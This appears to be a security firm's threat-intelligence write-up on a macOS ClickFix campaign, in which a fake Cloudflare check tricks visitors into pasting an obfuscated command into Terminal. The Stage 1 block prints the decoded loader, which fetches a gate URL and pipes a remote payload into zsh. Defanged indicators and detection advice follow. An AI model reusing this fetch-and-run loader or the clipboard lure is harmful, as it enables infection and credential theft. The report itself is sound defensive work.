# ClickFix (macOS): fake Cloudflare Turnstile → tokenised gate → fileless `curl | zsh`

**Observed:** 2026-08-04, ~14:42 UTC  
**Delivery:** German primary-school website (compromised or abused as a lure; kept anonymous — the operator has been notified and the site is not attacker-owned)  
**Reported by:** Novum Analytica GmbH, Berlin · TLP:CLEAR  
**Analysis:** static only. Nothing was executed, no attacker host was contacted.
**Scope note:** that statement covers this write-up's 14:42 UTC analysis. Later
infrastructure mapping the same day *did* contact attacker hosts (download-only) —
see [`cluster_expansion.md`](cluster_expansion.md).

> All hosts below are defanged for reading. Use the live forms when submitting to
> automated platforms — defanged values will not parse.

---

## Summary

A fake Cloudflare "human verification" overlay instructs the visitor to press
`⌘+Space → Terminal → ⌘+V → Enter`. The page writes an obfuscated shell command to the
clipboard on load; the victim then executes it under their own user context, which bypasses
Gatekeeper, XProtect and any browser download control. The command contacts a gating server
with a per-victim token and, only on approval, pipes a second stage straight into `zsh` —
nothing touches disk.

The interesting part is the gate. It makes the payload single-use per victim, which defeats
sandbox re-execution and gives the operator clean per-click telemetry. It also means
retrospective retrieval of stage 2 is impossible without a fresh, unburned token.

---

## Chain

**Stage 0 — clipboard**

The pasted command carried a campaign session marker and a base64 blob wrapped in
`eval "$(printf '%s' '<b64>' | base64 -d)"`.

**Stage 1 — decoded**

```sh
_xr=$(curl -s 'hxxp://enter-pverif-code[.]info/p/b143d253…c25cfab')
if [ "$_xr" = "ok" ]; then
    curl -s $(echo "<base64>" | openssl base64 -d -A) | zsh
fi
```

Three things worth noting:

- The gate returns `ok` exactly once per token. Second request → no execution.
- Stage 1 is plain `http://`, stage 2 is `https://`.
- The inner layer uses `openssl base64 -d -A` rather than `base64 -d`. Same result, different
  string — likely to break naive clipboard/history signatures keyed on the obvious form.

**Stage 2 — decoded from the inner blob**

```
hxxps://ferncurrent14[.]com/curl/a7ec41c8…517f0b2
```

Piped directly to `zsh`. Not retrieved (see caveats).

---

## IOCs

| Type | Value | Role |
|---|---|---|
| domain | `enter-pverif-code[.]info` | stage-1 gate / click telemetry |
| url | `hxxp://enter-pverif-code[.]info/p/b143d253…c25cfab` | per-victim token (burned) |
| domain | `ferncurrent14[.]com` | stage-2 loader host |
| url | `hxxps://ferncurrent14[.]com/curl/a7ec41c8…517f0b2` | stage-2 payload |

The stage-1 path component is session-scoped and has no reuse value. The stage-2 path hash
appears campaign-scoped and is the more durable indicator.

Behavioural markers: throwaway variable prefixes `_7dcf` / `_xr`; `eval` over a
base64-decoded `printf`; `openssl base64 -d -A` as a second decode layer; `curl -s … | zsh`.

---

## ATT&CK

`T1204.004` Malicious Copy and Paste · `T1059.004` Unix Shell · `T1027.013` Encrypted/Encoded
File · `T1105` Ingress Tool Transfer · `T1555.001` Credentials from Keychain (expected, not
confirmed)

---

## Caveats

Stage 2 was never retrieved, so **no malware family is attributed here**. The loader is
family-agnostic — `curl | zsh` looks identical whether it lands AMOS, MacSync or SHub, all of
which have been reported using ClickFix delivery on macOS during 2026. Anyone extending this
should resolve the family from the payload, not from the chain shape.

The lure domain is a victim. Do not add it to blocklists — doing so blocks a school website
for its own community and creates a delisting problem for people who did nothing wrong.

---

## Notes for defenders

`curl | sh` is common enough in developer workflows that a naive rule on it will drown you.
The higher-fidelity signal on macOS is the combination of an interactive `Terminal`/`iTerm2`
parent, an `eval` over a decoded blob, and a network fetch to a domain first seen days ago.
Clipboard provenance is the real tell, but few endpoint stacks capture it.

Worth checking on any suspected host: `~/.zsh_history` and `~/.bash_history` for the markers
above. Absence proves little — `HISTFILE` manipulation is trivial and some ClickFix variants
prepend a space to suppress history under `HIST_IGNORE_SPACE`.
